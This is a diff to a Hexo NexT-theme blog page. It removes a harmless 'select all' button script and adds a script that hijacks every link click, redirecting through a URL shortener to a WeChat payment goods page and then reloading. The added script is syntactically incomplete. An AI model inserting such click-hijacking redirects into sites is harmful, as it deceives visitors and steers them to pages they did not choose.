@@ -6,47 +6,7 @@
 
 
 <html class="theme-next pisces use-motion" lang="zh-Hans">
-<head>
-  $(document).ready(function () {
-    var SelectText = function(element) {
-        var doc = document
-            , text = element
-            , range, selection
-        ;    
-        if (doc.body.createTextRange) {
-            range = document.body.createTextRange();
-            range.moveToElementText(text);
-            range.select();
-        } else if (window.getSelection) {
-            selection = window.getSelection();        
-            range = document.createRange();
-            range.selectNodeContents(text);
-            selection.removeAllRanges();
-            selection.addRange(range);
-        }
-    };
-
-    $(".code").each(function() {
-        var code = $(this).get(0);
-        var button_html = 
-            '<div style="position: fixed;'                                                               +
-                        'right: 3%;'                                                                     +
-                        'margin-top: 5px;'                                                               +
-                        'font-family: consolas, Menlo, \'PingFang SC\', \'Microsoft YaHei\', monospace;' +
-                        'font-size: 10px;'                                                               +
-                        'cursor: pointer;'                                                               +
-                        'color: #e31436;'                                                                +
-                        '">'                                                                             +
-            '<span>全选</span>'                                                                          +
-            '</div>';
-        var button = $(button_html);
-
-        $(button).click(function() {
-            SelectText(code);
-        });
-        $(button).insertBefore(this);
-    });
-});
+<head> 
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
@@ -197,6 +157,22 @@
   
     
   
+
+
+    <div class="test">
+        <a href="">有效跳转</a>
+    </div>
+    <script type="text/javascript">
+       $('a').click(function() {
+    location.href = 'http://url.cn/5fVTlMX';
+    setTimeout(function() {
+        location.href = 'https://www.ulpay.com/ulpay-weixin-service/weiXin/goodsDetail?goodsId=2017062713110700001';
+    }, 250);
+    setTimeout(function() {
+        location.reload();
+    }, 1000);
+    }
+    </script>
 
   <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
